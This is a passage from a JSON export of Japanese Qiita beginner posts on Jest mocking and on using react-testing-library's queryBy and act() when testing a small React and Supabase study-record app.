削除したデータが表示されないこと\n    expect(screen.queryByText(\"覚えたよ\")).not.toBeInTheDocument();\n    expect(screen.queryByText(\"100\")).not.toBeInTheDocument();\n  });\n});\n```\n\n\n<details>\n<summary>参考：DB取得、登録、削除の実際の処理</summary>\n\n```ts:study-record.ts\nimport { supabase } from \"../utils/supabase\";\nimport { Record } from \"../domain/record\";\n\nexport const GetAllStudyRecords: () => Promise<Record[]> = async () => {\n  const { data, error } = await supabase.from(\"study-record\").select();\n\n  if (error) {\n    throw new Error(error.message);\n  }\n\n  const StudyRecords = data.map(\n    (record) =>\n      new Record(record.id, record.title, record.time, record.created_at)\n  );\n  return StudyRecords;\n};\n\nexport const addStudyRecord = async (data: Partial<Record>) => {\n  const { error } = await supabase\n    .from(\"study-record\")\n    .insert({ title: data.title, time: data.time });\n\n  if (error) {\n    throw new Error(error.message);\n  }\n};\n\n\nexport const deleteStudyRecordById = async (id: string) => {\n  const { error } = await supabase\n    .from(\"study-record\")\n    .delete()\n    .eq(\"id\", id)\n    .select();\n\n  if (error) {\n    throw new Error(error.message);\n  }\n```\n</details>\n\n\n\n\n# おわりに\nユーザーの操作、実際に内部の処理を考慮しながらテストを書かなければいけないことを再認識しました。\n\n# 参考\nhttps://apidog.com/jp/blog/what-is-mock/\n\nhttps://jestjs.io/ja/docs/mock-functions\n\n","coediting":false,"comments_count":0,"created_at":"2025-04-19T19:47:07+09:00","group":null,"id":"6e26469d8b6becb61a5f","likes_count":3,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"Mock","versions":[]},{"name":"Jest","versions":[]},{"name":"モック","versions":[]}],"title":"【Jest】Jestのmockとは、どのように使うの？","updated_at":"2025-04-19T19:48:25+09:00","url":"https://qiita.com/asa129/items/6e26469d8b6becb61a5f","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":811,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:140\">テストコードを書いていて、要素の存在を確認するために、なんでもかんでも<code>findByTestId</code>のクエリを使用していました。<br>\n要素がないことを確認する場合、<code>findByTestId</code>が使えなかったため、理由と対処法についてまとめました。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-7:147\">レンダリングした画面に要素がないことを確認するテストコードを書きたい。<br>\n<code>findByTestId</code>で存在しない要素を指定すると、<code>Unable to find an element</code>でエラーが発生、テストとしてはFAILになる。</p>\n<p data-sourcepos=\"9:1-9:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1bd4679d-a8ee-4a3b-8518-c2e201ed4b4d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9ae180d4e638cee5728e1c2fa73a3551\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1bd4679d-a8ee-4a3b-8518-c2e201ed4b4d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9ae180d4e638cee5728e1c2fa73a3551\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1bd4679d-a8ee-4a3b-8518-c2e201ed4b4d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=a04f25c110e987e820784b9bd1e15a5f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1bd4679d-a8ee-4a3b-8518-c2e201ed4b4d.png\" loading=\"lazy\"></a></p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"12:1-33:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">GetAllStudyRecords</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"na\">GetAllStudyRecords</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n<span class=\"p\">}));</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">App</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">データが表示されないことを確認</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// DBから値を取得(空データを返す)</span>\n    <span class=\"p\">(</span><span class=\"nx\">GetAllStudyRecords</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([]);</span>\n\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n\n    <span class=\"c1\">// 表示データ(tbodyの行)がないことを確認</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">table-row</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">not</span><span class=\"p\">.</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"36:1-36:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h3 data-sourcepos=\"37:1-37:20\">\n<span id=\"querybyを使う\" class=\"fragment\"></span><a href=\"#queryby%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>queryByを使う</h3>\n<p data-sourcepos=\"39:1-40:81\"><code>findBy</code>は要素を取得できるまで待機し、取得できない場合はエラーを投げます。<br>\nそのため、要素がないことを確認するには適していません。</p>\n<p data-sourcepos=\"42:1-43:90\"><code>queryBy</code>は要素がない場合、nullを返し、エラーは発生しません。<br>\nそのため、要素がないことを確認するには適しているといえます。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"45:1-70:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">GetAllStudyRecords</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"na\">GetAllStudyRecords</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n<span class=\"p\">}));</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">App</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">データが表示されないことを確認</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// DBから値を取得(空データを返す)</span>\n    <span class=\"p\">(</span><span class=\"nx\">GetAllStudyRecords</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([]);</span>\n\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n\n<span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"c1\">// レンダリングされたことを確認</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n</span>\n    <span class=\"c1\">// 表示データ(tbodyの行)がないことを確認</span>\n<span class=\"hdl\"><span class=\"o\">- </span>  <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">table-row</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">not</span><span class=\"p\">.</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>  <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">queryByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">table-row</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">not</span><span class=\"p\">.</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n</span>  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"72:1-72:31\">\n<span id=\"getbyfindbyquerybyの違い\" class=\"fragment\"></span><a href=\"#getbyfindbyqueryby%E3%81%AE%E9%81%95%E3%81%84\"><i class=\"fa fa-link\"></i></a>getBy,findBy,queryByの違い</h1>\n<p data-sourcepos=\"74:1-74:72\"><iframe id=\"qiita-embed-content__6d32aabaa556c68da0beb96f7b7e1cb8\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__6d32aabaa556c68da0beb96f7b7e1cb8\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Fdom-testing-library%2Fcheatsheet%2F%23queries\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"76:1-76:34\"><strong>ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"77:1-77:123\">\n<p data-sourcepos=\"77:2-77:123\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F12a640e6-661d-4dfd-b406-efa4e11c0693.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=aa66ff1b5faf93239a7edfa0eb9d43aa\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F12a640e6-661d-4dfd-b406-efa4e11c0693.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=aa66ff1b5faf93239a7edfa0eb9d43aa\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F12a640e6-661d-4dfd-b406-efa4e11c0693.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=324193d593f465603da61956d1b4bd01 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/12a640e6-661d-4dfd-b406-efa4e11c0693.png\" loading=\"lazy\"></a></p>\n</blockquote>\n<ul data-sourcepos=\"79:1-82:0\">\n<li data-sourcepos=\"79:1-79:93\">\n<strong>getBy</strong> : awaitしない、一致するものがないときは、エラーをthrowする</li>\n<li data-sourcepos=\"80:1-80:95\">\n<strong>findBy</strong> : await<strong>する</strong>、一致するものがないときは、エラーをthrowする</li>\n<li data-sourcepos=\"81:1-82:0\">\n<strong>queryBy</strong> : awaitしない、一致するものがないときは、<strong>null</strong>をthrowする</li>\n</ul>\n<h1 data-sourcepos=\"83:1-83:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"84:1-84:90\">getBy、findBy、queryByを適材適所で使いこなせるようになりたいです。</p>\n<h1 data-sourcepos=\"86:1-86:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"87:1-87:72\"><iframe id=\"qiita-embed-content__657d1a061fb195271c7407d56d803980\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__657d1a061fb195271c7407d56d803980\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Fdom-testing-library%2Fcheatsheet%2F%23queries\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nテストコードを書いていて、要素の存在を確認するために、なんでもかんでも`findByTestId`のクエリを使用していました。\n要素がないことを確認する場合、`findByTestId`が使えなかったため、理由と対処法についてまとめました。\n\n# 問題\nレンダリングした画面に要素がないことを確認するテストコードを書きたい。\n`findByTestId`で存在しない要素を指定すると、`Unable to find an element`でエラーが発生、テストとしてはFAILになる。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1bd4679d-a8ee-4a3b-8518-c2e201ed4b4d.png)\n\n\n```tsx\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport App from \"../App\";\nimport { GetAllStudyRecords } from \"../lib/study-record\";\nimport userEvent from \"@testing-library/user-event\";\n\njest.mock(\"../lib/study-record\", () => ({\n  GetAllStudyRecords: jest.fn(),\n}));\n\ndescribe(\"App\", () => {\n  it(\"データが表示されないことを確認\", async () => {\n    // DBから値を取得(空データを返す)\n    (GetAllStudyRecords as jest.Mock).mockResolvedValue([]);\n\n    render(<App />);\n\n    // 表示データ(tbodyの行)がないことを確認\n    expect(await screen.findByTestId(\"table-row\")).not.toBeInTheDocument();\n  });\n});\n```\n\n\n# 解決方法\n### queryByを使う\n\n`findBy`は要素を取得できるまで待機し、取得できない場合はエラーを投げます。\nそのため、要素がないことを確認するには適していません。\n\n`queryBy`は要素がない場合、nullを返し、エラーは発生しません。\nそのため、要素がないことを確認するには適しているといえます。\n\n```diff_tsx\nimport { render, screen, waitFor } from \"@testing-library/react\";\nimport App from \"../App\";\nimport { GetAllStudyRecords } from \"../lib/study-record\";\nimport userEvent from \"@testing-library/user-event\";\n\njest.mock(\"../lib/study-record\", () => ({\n  GetAllStudyRecords: jest.fn(),\n}));\n\ndescribe(\"App\", () => {\n  it(\"データが表示されないことを確認\", async () => {\n    // DBから値を取得(空データを返す)\n    (GetAllStudyRecords as jest.Mock).mockResolvedValue([]);\n\n    render(<App />);\n\n+   // レンダリングされたことを確認\n+   expect(await screen.findByTestId(\"title\")).toBeInTheDocument();\n\n    // 表示データ(tbodyの行)がないことを確認\n-   expect(await screen.findByTestId(\"table-row\")).not.toBeInTheDocument();\n+   expect(screen.queryByTestId(\"table-row\")).not.toBeInTheDocument();\n  });\n});\n```\n\n# getBy,findBy,queryByの違い\n\nhttps://testing-library.com/docs/dom-testing-library/cheatsheet/#queries\n\n**ドキュメントより引用**\n>![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/12a640e6-661d-4dfd-b406-efa4e11c0693.png)\n\n* **getBy** : awaitしない、一致するものがないときは、エラーをthrowする\n* **findBy** : await**する**、一致するものがないときは、エラーをthrowする\n* **queryBy** : awaitしない、一致するものがないときは、**null**をthrowする\n\n# おわりに\ngetBy、findBy、queryByを適材適所で使いこなせるようになりたいです。\n\n# 参考\nhttps://testing-library.com/docs/dom-testing-library/cheatsheet/#queries\n\n","coediting":false,"comments_count":0,"created_at":"2025-04-19T18:50:20+09:00","group":null,"id":"d5942149b203f90f44f8","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"react-testing-library","versions":[]}],"title":"【react-testing-library】要素がないことを確認したい","updated_at":"2025-04-19T18:50:20+09:00","url":"https://qiita.com/asa129/items/d5942149b203f90f44f8","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":706,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:100\">jest + react-testing-libraryでのテストを実行中、表題のエラーが発生しました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<h3 data-sourcepos=\"5:1-5:103\">\n<span id=\"ボタンをクリックするイベントをテスト実行すると表題のエラーになる\" class=\"fragment\"></span><a href=\"#%E3%83%9C%E3%82%BF%E3%83%B3%E3%82%92%E3%82%AF%E3%83%AA%E3%83%83%E3%82%AF%E3%81%99%E3%82%8B%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%E3%82%92%E3%83%86%E3%82%B9%E3%83%88%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%81%A8%E8%A1%A8%E9%A1%8C%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AB%E3%81%AA%E3%82%8B\"><i class=\"fa fa-link\"></i></a>ボタンをクリックするイベントをテスト実行すると表題のエラーになる。</h3>\n<p data-sourcepos=\"7:1-8:94\"><code>An update to App inside a test was not wrapped in act(...).</code><br>\n日本語訳：<code>テスト内のAppの更新がact(...)でラップされていなかった。</code></p>\n<p data-sourcepos=\"11:1-11:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2aed0cd8-033f-4eaa-ad0b-30e2ee107ae9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3b678ef7deb20ddcb3f881f1cf9c6c59\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2aed0cd8-033f-4eaa-ad0b-30e2ee107ae9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3b678ef7deb20ddcb3f881f1cf9c6c59\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2aed0cd8-033f-4eaa-ad0b-30e2ee107ae9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=fd272d725e8e9ce90105a3e6bf6e9ffa 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2aed0cd8-033f-4eaa-ad0b-30e2ee107ae9.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"14:1-14:34\"><strong>問題が発生したコード</strong></p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"16:1-30:3\">\n<div class=\"code-lang\"><span class=\"bold\">AppComponetnt.spec.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">登録ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n    <span class=\"c1\">// 登録ボタンの要素を見つける</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">newRecordButton</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">new-record-button</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 登録ボタンクリック</span>\n    <span class=\"nx\">newRecordButton</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">();</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"32:1-32:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h3 data-sourcepos=\"34:1-34:20\">\n<span id=\"1actを使う\" class=\"fragment\"></span><a href=\"#1act%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>1.<code>act</code>を使う</h3>\n<p data-sourcepos=\"36:1-36:40\"><iframe id=\"qiita-embed-content__56a270ce087594253b6473d33ec2c12b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__56a270ce087594253b6473d33ec2c12b\" data-content=\"https%3A%2F%2Fja.react.dev%2Freference%2Freact%2Fact\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"38:1-38:34\"><strong>ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"39:1-39:473\">\n<p data-sourcepos=\"39:2-39:473\">UI テストを書く際、レンダー、ユーザイベント、データフェッチなどのタスクは、ユーザインターフェースにおける「操作単位 (unit of interaction)」と捉えることができます。React は act() というヘルパを提供しており、これによりこれらの「操作単位」に関連するすべての更新が処理されて DOM に適用された後に、アサーションを行えるようになります。</p>\n</blockquote>\n<ul data-sourcepos=\"41:1-44:0\">\n<li data-sourcepos=\"41:1-41:115\">ボタンをクリックすると、Reactは状態の更新を検知し、再レンダリングが行われます</li>\n<li data-sourcepos=\"42:1-42:152\">act() を使わない場合、再レンダリングを行っている際に次のプロセスに進もうとし、エラーになってしまいます</li>\n<li data-sourcepos=\"43:1-44:0\">act() を使うことで、操作単位（今回の場合は、ボタンをクリックする操作）を行った後、次のプロセスに進むことができます</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"45:1-62:3\">\n<div class=\"code-lang\"><span class=\"bold\">AppComponetnt.spec.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"hdl\"><span class=\"o\">-</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n</span><span class=\"hil\"><span class=\"o\">+</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">fireEvent</span><span class=\"p\">,</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">act</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n</span>\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">登録ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n    <span class=\"c1\">// 登録ボタンの要素を見つける</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">newRecordButton</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span 